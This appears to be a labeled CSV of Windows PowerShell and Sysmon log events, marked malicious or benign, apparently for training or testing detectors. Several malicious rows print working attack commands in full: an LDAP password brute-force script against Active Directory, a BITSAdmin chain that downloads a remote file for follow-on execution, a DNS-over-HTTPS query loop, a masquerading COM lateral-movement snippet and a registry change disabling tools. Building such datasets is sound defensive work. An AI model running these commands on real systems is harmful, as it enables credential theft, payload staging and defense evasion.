sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
CYB499-011,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Variable, Started, 	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-012,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T14:07:49.1013093+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=13f77f91-182d-42e1-88d9-cec08938ab6a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig
	EngineVersion=5.1.19041.2673
	RunspaceId=453c9c4f-a508-4805-b0e7-0d82e09c2d6f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-013,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2025-04-16T15:41:47.2011938+00:00,Server002,,,powershell.exe -ExecutionPolicy Restricted -Command,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=71190939-e7e0-4c68-b7b3-87eb740e651d
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command 
 $Res = 0
 [UInt64]$MinDiskSpaceThreshold = 20 * 1024 * 1024 * 1024

 try {
 $SystemDrive = (Get-CimInstance Win32_OperatingSystem).SystemDrive
 $SystemDriveLetter = $SystemDrive[0]
 $SystemDriveSpace = (Get-Volume -DriveLetter $SystemDriveLetter).SizeRemaining
 Write-Host 'Current system drive space:', $SystemDriveSpace.ToString('N0')
 if ($SystemDriveSpace -lt $MinDiskSpaceThreshold) {
 Write-Host 'System drive space is less than the threshold:', $MinDiskSpaceThreshold.ToString('N0'), 'Block Upgrade.'
 $Res = 1
 }
 } catch {
 # Do nothing
 }

 Write-Host 'Final result:', $Res

	EngineVersion=5.1.19041.5007
	RunspaceId=8120aef8-8e80-4dec-8db1-21a11cb6a652
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-014,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:59.1785987,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /complete fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /complete fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /complete fileBITS
CYB499-015,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5122741,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-016,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.4170222,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume fileBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete fileBITS",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag...; user=SERVER002\admin_test","The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: ""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline f..."
CYB499-017,Malicious,Sysmon,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 15:11:09.8338813,Server002,SERVER002\admin_test,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\conhost.exe; cmd=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1; parent=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; parent_cmd=""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" ...; user=SERVER002\admin_test","This event is retained because its parent command line carries the same attack evidence: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}"
CYB499-018,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:32.2030808+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-019,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-02T08:52:34.4069081+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 14ed02b8-83a1-42f5-8af6-233f3cdcf576 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-020,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"FileSystem, Started, 	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-021,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 16:20:50.8800259,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c chcp",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c chcp; user=SERVER002\admin_test","The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: ""cmd.exe"" /c chcp"
CYB499-022,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:20:25.2262689+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=5b33f03a-9d03-4572-b5c4-54c3c3b2b930
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls
	EngineVersion=5.1.19041.2673
	RunspaceId=374f6804-2442-4166-9529-be30aab7645c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-023,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-28 15:11:15.8193503,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=5.1.19041.5007
	RunspaceId=6006f99d-554a-49e3-a5f8-1defe3b27241
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-024,Malicious,Sysmon,Defense Evasion,defense_evasion_disable_windows_registry_tool,data/raw/malicious/defense_evasion_disable_windows_registry_tool_json/T1112-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 14:46:00.2199015,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event modifies the DisableRegistryTools policy value to restrict registry tooling. Evidence: ""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f"
CYB499-025,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:42.2695249+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
